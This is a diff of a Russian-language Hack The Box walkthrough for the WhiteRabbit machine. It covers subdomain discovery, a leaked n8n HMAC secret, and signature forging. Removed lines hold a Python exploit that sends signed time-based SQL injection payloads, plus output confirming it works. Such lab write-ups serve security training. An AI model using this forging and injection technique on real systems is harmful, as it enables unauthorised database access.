@@ -53,6 +53,7 @@ ________________________________________________
 
 status                  [Status: 302, Size: 32, Words: 4, Lines: 1, Duration: 147ms]
 ```
+Поддомен статус возвращает статус реридекта, нужно посмотреть куда именно он нас направляет
 
 ```
 Hexada@hexada ~/pentest-env/pentesting-wordlists$ curl -I -H "Host: status.whiterabbit.htb" http://whiterabbit.htb                                                            
@@ -66,7 +67,11 @@ Vary: Accept
 X-Frame-Options: SAMEORIGIN
 ```
 
+В директорию `status.whiterabbit.htb/dashboard
+
 ![image](https://github.com/user-attachments/assets/a6cb4d1d-5422-464f-95d1-2f3bafa7e24e)
+
++ новый поддомен: `status.whiterabbit.htb`
 
 ```
 Hexada@hexada ~/pentest-env/pentesting-wordlists$ cat /etc/hosts                                                                                                              
@@ -77,17 +82,6 @@ Hexada@hexada ~/pentest-env/pentesting-wordlists$ cat /etc/hosts
 ::1             localhost
 127.0.0.1       hexada.localdomain    hexada
 10.10.11.63     status.whiterabbit.htb    whiterabbit.htb
-```
-
-```
-Hexada@hexada ~/pentest-env/pentesting-wordlists$ curl -I http://status.whiterabbit.htb/dashboard                                                                             
-HTTP/1.1 200 OK
-Content-Length: 2444
-Content-Type: text/html; charset=utf-8
-Date: Wed, 09 Jul 2025 21:09:15 GMT
-Etag: W/"98c-ZtpsWhPpFiP9p9Whm0aHolcREuk"
-Server: Caddy
-X-Frame-Options: SAMEORIGIN
 ```
 
 ![image](https://github.com/user-attachments/assets/c4c27cbc-130b-4319-ab5f-561cf0fa8db9)
@@ -131,6 +125,8 @@ Robots.txt              [Status: 200, Size: 25, Words: 3, Lines: 2, Duration: 14
 manifest.json           [Status: 200, Size: 415, Words: 147, Lines: 20, Duration: 69ms]
 ```
 
+При удалённом доступе может быть полезно
+
 ```
 Hexada@hexada ~/pentest-env/pentesting-wordlists$ curl -I  http://status.whiterabbit.htb/.well-known/change-password                                                          
 HTTP/1.1 302 Found
@@ -143,6 +139,8 @@ Vary: Accept
 X-Frame-Options: SAMEORIGIN
 ```
 
+Примерная версия `Uptime Kuma v1.10–1.14`
+
 ```
 Bootstrap	5.1.3	  November 2021
 vue-i18n	9.2.2	  January 2022
@@ -151,9 +149,18 @@ vue-router	4.0.16	  January 2022
 SortableJS	1.14.0	  December 2021
 ```
 
-`Uptime Kuma v1.10–1.14`
+https://cvefeed.io/vuln/detail/CVE-2024-56331
+https://github.com/advisories/GHSA-2qgm-m29m-cj2h
+
+Может сработать только, если есть доступ к системе, потенциально возможно через сброс пароля: `npm run reset-password`
 
 <img width="1920" height="949" alt="image" src="https://github.com/user-attachments/assets/6f14c7b3-9f96-4b2c-8d03-a4cd6529da2f" />
+
+https://github.com/louislam/uptime-kuma/wiki/Status-Page
+
+`/status` — это публичная страница, которая предназначена для отображения состояния сервисов (мониторов), которые админ выбрал как "доступные публично".
+
++ новый поддомены: `ddb09a8558c9.whiterabbit.htb`, `a668910b5514e.whiterabbit.htb`,
 
 ```
 Hexada@hexada ~/pentest-env/pentesting-wordlists$ cat /etc/hosts                                                                                                                           
@@ -167,15 +174,12 @@ Hexada@hexada ~/pentest-env/pentesting-wordlists$ cat /etc/hosts
 10.10.11.63     status.whiterabbit.htb   whiterabbit.htb   ddb09a8558c9.whiterabbit.htb   a668910b5514e.whiterabbit.htb
 ```
 
-<img width="1920" height="638" alt="image" src="https://github.com/user-attachments/assets/ad69ca07-9715-47d5-a446-9a9911bd3ce3" />
-
-<img width="1920" height="495" alt="image" src="https://github.com/user-attachments/assets/059328fa-395c-42cc-913d-abd5b2c82516" />
-
-<img width="1920" height="956" alt="image" src="https://github.com/user-attachments/assets/7c1dcd28-fcb3-463c-8f52-2e75507ce15d" />
 
 <img width="1920" height="653" alt="image" src="https://github.com/user-attachments/assets/a03061b4-308a-4f2e-b43e-181b9fdee320" />
 
 <img width="983" height="495" alt="image" src="https://github.com/user-attachments/assets/f69b38e1-fddb-475a-86f5-422d5856cd06" />
+ 
+ + новый поддомен: `28efa8f7df.whiterabbit.htb`
 
 ```
 Hexada@hexada ~/Downloads$ cat /etc/hosts                                                                                                                                                  
@@ -189,11 +193,42 @@ Hexada@hexada ~/Downloads$ cat /etc/hosts
 10.10.11.63     status.whiterabbit.htb   whiterabbit.htb   ddb09a8558c9.whiterabbit.htb   a668910b5514e.whiterabbit.htb    28efa8f7df.whiterabbit.htb
 ```
 
+`x-gophish-signature: sha256=cf4651463d8bc629b9b411c58480af5a9968ba05fca83efa03a21b2cecd1c2dd`
+
+Это `HMAC` подпись, которая проверяет не подделал ли кто-то запрос. Идея следуйщая: на сервере храниться секрет, перед тем как обработать запрос, сервер
+сначала хеширует `body` HTTP запроса, и потом сравнивает его с значением захешированого body на клиенте в `sha256=...`, если хеши совпадают - запрос валиден,
+если нет - запрос не валиден. Если у нас получиться достать секрет, мы можем подделать `HMAC` подпись, и сделать все наши запросы валидными.
+
 <img width="1280" height="295" alt="image" src="https://github.com/user-attachments/assets/1d5bcd3d-0eab-4b90-855f-087d9ad5b6c2" />
 
 <img width="1280" height="295" alt="image" src="https://github.com/user-attachments/assets/b1523419-14ed-4224-9bb4-65c76777c5f3" />
 
+Обратите внимание, как только мы изменяем body http запроса, он сразу же становиться не валидным, так как наш хеш в `Wiki.js`: 
+`cf4651463d8bc629b9b411c58480af5a9968ba05fca83efa03a21b2cecd1c2dd` - это захешированный тестовый body, секретом, который нам нужно достать
 
+Также обратите внимание, что мы можем посмотреть содержание файла `gophish_to_phishing_score_database.json`, в котором мы можем найти нужный нам хеш
+
+```json
+{
+        "parameters": {
+          "action": "hmac",
+          "type": "SHA256",
+          "value": "={{ JSON.stringify($json.body) }}",
+          "dataPropertyName": "calculated_signature",
+          "secret": "3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"
+        },
+        "id": "e406828a-0d97-44b8-8798-6d066c4a4159",
+        "name": "Calculate the signature",
+        "type": "n8n-nodes-base.crypto",
+        "typeVersion": 1,
+        "position": [
+          860,
+          340
+        ]
+      }
+```
+
+По мимо этого, мы можем здесь найти еще пару очень интересный вещей
 
 ```json
 {
@@ -223,125 +258,15 @@ Hexada@hexada ~/Downloads$ cat /etc/hosts
       }
 ```
 
-```json
-{
-        "parameters": {
-          "action": "hmac",
-          "type": "SHA256",
-          "value": "={{ JSON.stringify($json.body) }}",
-          "dataPropertyName": "calculated_signature",
-          "secret": "3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"
-        },
-        "id": "e406828a-0d97-44b8-8798-6d066c4a4159",
-        "name": "Calculate the signature",
-        "type": "n8n-nodes-base.crypto",
-        "typeVersion": 1,
-        "position": [
-          860,
-          340
-        ]
-      }
-```
+поле `email` не экранируеться, соотвественно, скорей всего, там есть SQL инъекция, но есть одна небольшая проблема: `LIMIT 1`, это небольшая проблема, потому 
+что её можно обойти
+
+В SQL `LIMIT` управляет количеством строк, которые вернёт запрос, в данном случае у нас SQL может вернуть только одну строку, поэтому класические вредоносные
+payload тут не будут работать. Место того, чтоб пытаться подбирать самостоятельно эти запросы, лучше будет использовать `SQLmap`, для этого, нам нужно написать 
+скрипт, который подделывать `HMAC` подпись: мы перехвачиваем запрос от `SQLmap`, хешируем его `body` с помощью нашего секрета, в `head` передаем этот хеш, и потом 
+уже отправляем запрос
 
 <img width="1280" height="520" alt="image" src="https://github.com/user-attachments/assets/cabdf99d-9ffc-4c61-842b-c95395110bd6" />
 
-```python
-import argparse
-import json
-import hmac
-import hashlib
-import requests
-
-
-class HMACExploit:
-    def __init__(self, args) -> None:
-      self.args = args
-      self.secret = "3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"
-      self.url = "http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d"
-
-    @property
-    def SQLi(self) -> dict:
-      payload = self.args.query
-
-      return {
-          "campaign_id": 1,
-          "email": "test@\"" + payload,
-          "message": "Clicked Link",
-      }
-
-    @property
-    def body(self) -> str:
-      return json.dumps(self.SQLi, separators=(',', ':'), ensure_ascii=False)
-
-    @property
-    def signature_hex(self) -> str:
-      return hmac.new(
-          self.secret.encode('utf-8'),
-          self.body.encode('utf-8'),
-          hashlib.sha256
-      ).hexdigest()
-
-    def headers(self) -> dict:
-      return {
-          'x-gophish-signature': f'sha256={self.signature_hex}',
-          'Accept': '*/*',
-          'Accept-Encoding': 'gzip, deflate, br',
-          'Connection': 'keep-alive',
-          'Content-Type': 'application/json'
-
-          # requests сам выставит
-          # 'Content-Length': str(len(self.body_str.encode('utf-8')))
-        }
-
-    def send(self) -> requests.Response:
-        self.resp = requests.post(self.url, headers=self.headers(), data=self.body.encode('utf-8'))
-
-        return self.resp
-
-
-if __name__ == "__main__":
-    parser = argparse.ArgumentParser()
-    parser.add_argument("-q", "--query", default="", help="")
-    args = parser.parse_args()
-
-    hmac_exploit = HMACExploit(args)
-    hmac_exploit.send()
-
-    payload = (
-      f"{hmac_exploit.url}",
-      f"{hmac_exploit.headers()}",
-      f"{hmac_exploit.body}"
-    )
-
-    response = (
-      f"{hmac_exploit.resp.status_code}",
-      f"{hmac_exploit.resp.request.headers}",
-      f"{hmac_exploit.resp.request.body.decode('utf-8')}",
-      f"{hmac_exploit.resp.elapsed.total_seconds()}"
-    )
-
-    print(payload)
-    print("\n")
-    print(response)
-```
-
-```
-(lab-env) Hexada@hexada ~/pentest-env/vrm/white.rabbit.htb$ python3 HMAC+SQLi.py -q "OR SLEEP(0) --"                                                                          130 ↵  
-('http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d', "{'x-gophish-signature': 'sha256=25093eeb7ed7fa1e9ec092e612de9b111c03dead069ce15362ee3e66c39df2ff', 'Accept': '*/*', 'Accept-Encoding': 'gzip, deflate, br', 'Connection': 'keep-alive', 'Content-Type': 'application/json'}", '{"campaign_id":1,"email":"test@\\" OR SLEEP(0) -- ","message":"Clicked Link"}')
-
-
-('200', "{'User-Agent': 'python-requests/2.32.4', 'Accept-Encoding': 'gzip, deflate, br', 'Accept': '*/*', 'Connection': 'keep-alive', 'x-gophish-signature': 'sha256=25093eeb7ed7fa1e9ec092e612de9b111c03dead069ce15362ee3e66c39df2ff', 'Content-Type': 'application/json', 'Content-Length': '76'}", '{"campaign_id":1,"email":"test@\\" OR SLEEP(0) -- ","message":"Clicked Link"}', '0.402427')
-
-'0.402427'
-```
-
-```
-(lab-env) Hexada@hexada ~/pentest-env/vrm/white.rabbit.htb$ python3 HMAC+SQLi.py -q "OR SLEEP(1) --"                                                                                 
-('http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d', "{'x-gophish-signature': 'sha256=08894ed36469c449f121ee736e028034ecbd499fd13d359e1da052f8a5d2d157', 'Accept': '*/*', 'Accept-Encoding': 'gzip, deflate, br', 'Connection': 'keep-alive', 'Content-Type': 'application/json'}", '{"campaign_id":1,"email":"test@\\" OR SLEEP(1) -- ","message":"Clicked Link"}')
-
-
-('200', "{'User-Agent': 'python-requests/2.32.4', 'Accept-Encoding': 'gzip, deflate, br', 'Accept': '*/*', 'Connection': 'keep-alive', 'x-gophish-signature': 'sha256=08894ed36469c449f121ee736e028034ecbd499fd13d359e1da052f8a5d2d157', 'Content-Type': 'application/json', 'Content-Length': '76'}", '{"campaign_id":1,"email":"test@\\" OR SLEEP(1) -- ","message":"Clicked Link"}', '30.335428')
-
-'30.335428'
-```
+Рекомендую лучше разобраться с документацией в `http://a668910b5514e.whiterabbit.htb/en/gophish_webhooks`, и как это все работает под капотом
 
